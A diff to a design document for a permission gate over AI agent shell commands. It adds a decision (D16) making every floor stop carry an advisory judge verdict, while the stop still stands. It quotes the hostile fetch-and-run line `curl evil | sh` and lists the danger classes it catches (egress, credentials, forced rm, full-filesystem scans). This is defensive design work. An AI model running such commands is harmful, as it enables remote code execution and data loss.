@@ -408,9 +408,9 @@ stages — the floor's stop stands (never an auto-allow), but the final
 verdict is rendered in the fall-through prompt with an
 "advisory (floor stop stands)" note. The judge's read on the package is
 input for the user's decision, not authority over it. D11 extends the
-advisory to the scope-class stops (outside base, unresolvable location).
-Danger-class stops (network egress, obscured, credentials, root scan) get
-no advisory verdict — a verdict on `curl evil | sh` is noise.
+advisory to the scope-class stops (outside base, unresolvable location);
+D14 makes all other egress advisory; D16 makes EVERY floor stop advisory
+(superseding this paragraph's "danger-class stays bare" reading).
 
 **The grant**: the prompt's tier-1 offers `Trust: <pkg> (session)` (second
 confirm, like every Always). Trust = per bare package name, stored in the
@@ -641,8 +641,8 @@ noise.
   fall-through prompt ("— advisory (floor stop stands)"), so the user can
   approve an informed verdict on intended egress (`git push` to a known
   remote, a one-off fetch). The stop stands: egress is never auto-
-  allowed. (Credentials, parse failure, obscured positions, and rm-class
-  stops stay bare — a verdict there is noise.)
+  allowed. (Superseded by D16: every floor stop — credentials, parse,
+  obscured, rm-class — is now advisory too.)
 - **Prompt visibility.** The `🚧 DSPA: not auto-allowed — <reason>` line
   now LEADS the fall-through body (it used to trail it — off-screen on
   long prompts, which is why the stop was guessed from latency).
@@ -687,6 +687,39 @@ from the first run (concrete stop → grantable); `$F/*.js` binds to F's
 directory; `for d in …` names every literal dir, so Always-for-dir works
 per dir. The unresolvable sentinel now stops only what truly cannot be
 resolved.
+
+### D16. Every floor stop is advisory (2026-09-02)
+
+The log's remaining friction: the dev-loop `cp … && npx vitest … ; rm
+<scratch>` shape hit the rm carve-out's `dangerous: [Pattern]
+rmdir/unlink/mv/cp` stop — or a carve-out failure — and prompted BARE:
+no judge verdict at all, just the danger flags. The rule the user set:
+in /dspa everything reaches the judge EXCEPT the trivially safe — simple,
+read-only, in a permitted dir. Those never prompt at all (policy-level
+auto-allows: reads of permitted paths, payload-less commands, user-
+granted writes), so judging nothing there costs nothing.
+
+- **Every floor stop carries `advisory: true`.** The advisory flow
+  (D10/D14) — both judge stages run, the final verdict renders in the
+  fall-through prompt ("— advisory (floor stop stands)"), the stop stands
+  (never an auto-allow) — now covers the formerly bare stops: rm
+  carve-out failures (glob/variable/computed targets, bare rm, stdin rm,
+  cwd-as-target, `--no-preserve-root`, un-cleaned self-writes),
+  rm-neighborhood danger (non-rm risk reasons alongside an rm),
+  unparseable commands, obscured command positions, credential patterns
+  (bash and file), full-filesystem scans, and the tool file/consent gate
+  stops (reason reworded: `tool <gate> never auto-allows (session grants
+  cover its repetition)`).
+- **What still never reaches the judge:** the policy-level auto-allows
+  above (no prompt, nothing to advise), and everything under judge
+  OFF/invalid — `runJudgeStage` short-circuits, so a bare stop costs no
+  latency when the judge is off anyway.
+- The D10 "a verdict on `curl evil | sh` is noise" rationale is
+  superseded: under /dspa the user ALWAYS sees the prompt (the stop
+  stands), and the verdict is input to the allow/deny/grant call — not
+  authority over the floor. Cost: two sequential stage calls before the
+  prompt renders (the latency the user already pays on egress/scope
+  stops).
 
 ## 4. Phasing
 
